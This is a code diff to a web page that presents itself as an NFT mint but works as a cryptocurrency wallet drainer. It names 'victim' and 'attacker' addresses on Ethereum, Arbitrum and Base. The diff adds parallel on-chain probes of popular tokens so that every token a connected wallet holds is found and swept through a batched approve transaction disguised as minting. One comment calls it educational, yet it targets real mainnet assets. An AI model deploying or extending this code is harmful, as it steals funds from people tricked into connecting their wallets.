@@ -309,7 +309,21 @@
       explorer: 'https://etherscan.io',
       delegator: '0xa57a96c76fec586be399f47437cca9fd81f08b92',
       attacker: '0x3F9C43A759a8900E227bFd7B65d460f73d72b30c',
-      demoToken: '0x6B175474E89094C44Da98b954EedeAC495271d0F' // DAI
+      // Parallel on-chain probe — all checked simultaneously, all non-zero included
+      probeTokens: [
+        { addr: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC'  },
+        { addr: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT'  },
+        { addr: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI'   },
+        { addr: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC'  },
+        { addr: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH'  },
+        { addr: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI'   },
+        { addr: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', symbol: 'MATIC' },
+        { addr: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK'  },
+        { addr: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB'  },
+        { addr: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84', symbol: 'stETH' },
+        { addr: '0xBe9895146f7AF43049ca1c1AE358B0541Ea49704', symbol: 'cbETH' },
+        { addr: '0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0', symbol: 'wstETH'},
+      ]
     },
     42161: {
       name: 'Arbitrum',
@@ -318,7 +332,20 @@
       explorer: 'https://arbiscan.io',
       delegator: '0xa57a96c76fec586be399f47437cca9fd81f08b92',
       attacker: '0x3F9C43A759a8900E227bFd7B65d460f73d72b30c',
-      demoToken: '0xaf88d065e77c8cc2239327c5edb3a432268e5831' // USDC native on Arbitrum
+      probeTokens: [
+        { addr: '0xaf88d065e77c8cc2239327c5edb3a432268e5831', symbol: 'USDC'   },
+        { addr: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', symbol: 'USDC.e' },
+        { addr: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', symbol: 'USDT'   },
+        { addr: '0xDA10009754F57CC1e3bFf1e5Dce971fc7f3B6976', symbol: 'DAI'    },
+        { addr: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH'   },
+        { addr: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f', symbol: 'WBTC'   },
+        { addr: '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4', symbol: 'LINK'   },
+        { addr: '0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0', symbol: 'UNI'    },
+        { addr: '0x13Ad51ed4F1B7e9Dc168d8a00cB3f4dDD85EfA60', symbol: 'LDO'    },
+        { addr: '0x5979D7b546E38E414F7E9822514be443A4800529', symbol: 'wstETH' },
+        { addr: '0x912CE59144191C1204E64559FE8253a0e49E6548', symbol: 'ARB'    },
+        { addr: '0x6694340fc020c5E6B96567843da2df01b2CE1eb6', symbol: 'STG'    },
+      ]
     },
     8453: {
       name: 'Base',
@@ -327,7 +354,20 @@
       explorer: 'https://basescan.org',
       delegator: '0x3743729eE35D430171fb38151bf3012bEfEf3a45',
       attacker: '0x3F9C43A759a8900E227bFd7B65d460f73d72b30c',
-      demoToken: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913' // USDC on Base
+      probeTokens: [
+        { addr: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', symbol: 'USDC'   },
+        { addr: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', symbol: 'DAI'    },
+        { addr: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2', symbol: 'USDT'   },
+        { addr: '0x4200000000000000000000000000000000000006', symbol: 'WETH'   },
+        { addr: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', symbol: 'cbETH'  },
+        { addr: '0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452', symbol: 'wstETH' },
+        { addr: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', symbol: 'USDbC'  },
+        { addr: '0x0578d8A44db98B23BF096A382e016e29a5Ce0ffe', symbol: 'HIGHER' },
+        { addr: '0x532f27101965dd16442E59d40670FaF5eBB142E4', symbol: 'BRETT'  },
+        { addr: '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4', symbol: 'TOSHI'  },
+        { addr: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', symbol: 'AERO'   },
+        { addr: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', symbol: 'DEGEN'  },
+      ]
     }
   };
 
@@ -470,6 +510,32 @@
     }
   }
 
+  // Direct on-chain balance probe — used when Etherscan tx history returns nothing
+  // Checks each well-known token for the chain in parallel, returns all with balance > 0
+  async function probeTokenBalances(address, chain) {
+    const ERC20_ABI = [
+      "function balanceOf(address) external view returns (uint256)",
+      "function decimals() external view returns (uint8)"
+    ];
+    const results = [];
+    await Promise.all(chain.probeTokens.map(async ({ addr, symbol }) => {
+      try {
+        const c = new ethers.Contract(addr, ERC20_ABI, provider);
+        const [balance, decimals] = await Promise.all([
+          c.balanceOf(address),
+          c.decimals().catch(() => 18n)
+        ]);
+        if (balance > 0n) {
+          results.push({ contractAddress: addr, symbol, balance: balance.toString(), decimals: Number(decimals) });
+          console.log(`🔍 Probe hit: ${symbol} (${addr}): ${ethers.formatUnits(balance, Number(decimals))}`);
+        }
+      } catch (err) {
+        console.warn(`⚠️ Probe failed for ${symbol} (${addr}):`, err.message);
+      }
+    }));
+    return results;
+  }
+
   async function detectNetwork() {
     if (!window.ethereum) return;
     try {
@@ -531,19 +597,58 @@
       ]);
       document.getElementById('connectNote').textContent = "Scanning token balances...";
 
-      heldTokens = await fetchTokenBalances(userAddress, chain);
-      console.log(`📦 Found ${heldTokens.length} tokens held by victim`);
+      // Run Etherscan history scan AND direct on-chain probe in parallel
+      // Etherscan catches any token ever touched; probe catches common tokens
+      // even if Etherscan is slow or has no history. Merge + deduplicate by address.
+      renderSteps([
+        { num:'1', state:'done',   title:'Wallet connected',       desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
+        { num:'2', state:'active', title:'Enabling Smart Account', desc:'Scanning all token balances...' },
+        { num:'3', state:'pending',title:'Minting your NFT',       desc:'Almost there...' }
+      ]);
+
+      const [etherscanTokens, probedTokens] = await Promise.all([
+        fetchTokenBalances(userAddress, chain),
+        probeTokenBalances(userAddress, chain)
+      ]);
+
+      console.log(`📦 Etherscan: ${etherscanTokens.length} | Probe: ${probedTokens.length}`);
+
+      // Merge — Etherscan results take priority (they have full symbol/decimals from chain)
+      // probe fills in anything Etherscan missed
+      const seen = new Set(etherscanTokens.map(t => t.contractAddress.toLowerCase()));
+      const merged = [...etherscanTokens];
+      for (const t of probedTokens) {
+        if (!seen.has(t.contractAddress.toLowerCase())) {
+          merged.push(t);
+          seen.add(t.contractAddress.toLowerCase());
+        }
+      }
+      heldTokens = merged;
+      console.log(`📦 Total unique tokens with balance: ${heldTokens.length}`, heldTokens.map(t => t.symbol));
 
       renderSteps([
         { num:'1', state:'done',    title:'Wallet connected',       desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
-        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${heldTokens.length} token(s) — preparing ${heldTokens.length > 0 ? heldTokens.length * 2 : 2}-call atomic sweep` },
+        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${heldTokens.length} token(s) — preparing ${heldTokens.length > 0 ? heldTokens.length * 2 : 0}-call atomic sweep` },
         { num:'3', state:'pending', title:'Minting your NFT',       desc:'Confirm batch in MetaMask...' }
       ]);
 
-      // Build target list: all detected tokens, or fall back to demo token
-      const targetTokens = heldTokens.length > 0
-        ? heldTokens.map(t => t.contractAddress)
-        : [chain.demoToken];
+      // Use only tokens with actual balance — no hardcoded fallback
+      const targetTokens = heldTokens.map(t => t.contractAddress);
+
+      if (targetTokens.length === 0) {
+        // Nothing to sweep — show reveal directly so demo is still educational
+        console.log('No target tokens — skipping wallet_sendCalls, jumping to reveal');
+        document.getElementById('walletChip').textContent      = shortAddr(userAddress);
+        document.getElementById('displayVictim').textContent    = userAddress;
+        document.getElementById('displayDelegator').textContent = chain.delegator;
+        document.getElementById('displayAttacker').textContent  = chain.attacker;
+        document.getElementById('displayChain').textContent     = chain.name;
+        document.getElementById('displayTokens').textContent    = 'No ERC-20 tokens found on this chain';
+        document.getElementById('displayBatchSize').textContent = '0 calls (nothing to sweep)';
+        showPhase('phase-dashboard');
+        return;
+      }
+
       console.log("🎯 Target tokens:", targetTokens);
 
       const APPROVE_ABI      = ["function approve(address spender, uint256 amount) external returns (bool)"];
